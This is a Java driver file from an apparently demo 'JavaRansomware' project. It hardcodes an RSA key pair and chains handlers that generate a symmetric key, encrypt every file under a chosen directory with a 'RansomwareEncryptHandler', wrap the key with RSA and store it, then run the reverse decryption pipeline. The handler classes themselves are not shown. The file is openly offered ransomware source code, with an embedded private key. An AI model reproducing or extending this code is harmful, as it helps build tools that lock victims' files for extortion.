package com.security;


import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;

public class Example {
    private static final String PubicKey = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJCw1HHQooCFGsGhtxNrsdS6dDq5jtfHqqLInCj7qFlDaD/Sll5+BAUjV0GU/c+6PVyMKzmLrHh49eeGQy1ETN8CAwEAAQ==";
    private static final String PrivateKey = "MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAkLDUcdCigIUawaG3E2ux1Lp0OrmO18eqosicKPuoWUNoP9KWXn4EBSNXQZT9z7o9XIwrOYuseHj154ZDLURM3wIDAQABAkA9AnLx8tkye+2GTBwYEkcPvfcYc/mpPsXSkehW15Zq3IALx3Kr5GgKGOaB2FK6PU0QzEPQbNJXdA5ZPjwTDcQBAiEA1/zINRVlrLpw2HPfqsYQ8ZSDuG2rVUUKKmKgJQXeQ98CIQCrfsw2+VKOaFoJm5BpVxIT5nsE8CXn4fr/WSFuklMXAQIgTKWnAreCKmbLTvTn5bl+H8zdZaB9kbf7YIk5XYoUky8CIQCL2ccnPYK5ZxelphrKDJtNZzMC/+OpiXtqKIE+7kycAQIgRK/DUhWUgSQV5u7VoCHDyLPCntjFMGBsg7Wi1uq+EDM=";


    public static void main(String[] args) throws RansomwareException, GeneralSecurityException {
        // Set Whatever path you want to test
        Path testPath = Paths.get("C:\\Users\\User\\Documents\\GitHub\\JavaRansomware\\src\\resources");
        //Path testPath = Paths.get(Objects.requireNonNull(ExampleTest.class.getResource("/test.txt")).toURI());
        PipelineData pipelineData = new PipelineData();
        pipelineData.setPrivateKey(PrivateKey);
        pipelineData.setPublicKey(PubicKey);

        // Alternative Gen RSA. Make sure you save the keypair to a file if not loaded
//        RSAGenKeyReader.StringKeyPair keyPair=RSAGenKeyReader.generateKeyPair();
//        pipelineData.setPrivateKey(keyPair.privateKey());
//        pipelineData.setPublicKey(keyPair.publicKey());

        pipelineData.setRootPath(testPath.toAbsolutePath().toString());

        Pipeline<PipelineData, PipelineData> encrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
                .addHandler(new GenSymmetricKeyHandler())
                .addHandler(new RansomwareEncryptHandler())
                .addHandler(new EncryptKeyHandler())
                .addHandler(new DatabaseStoreHandler());
        var encrypt_output = encrypt_filters.execute(pipelineData);
        System.out.println("Pipeline encrypt_output: " + encrypt_output);


        Pipeline<PipelineData, PipelineData> decrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
                .addHandler(new DecryptKeyHandler())
                .addHandler(new RansomwareDecryptHandler())
                .addHandler(new DecryptKeyHandler());
        var decrypt_output = decrypt_filters.execute(pipelineData);
        System.out.println("Pipeline output: " + decrypt_output);
    }
}
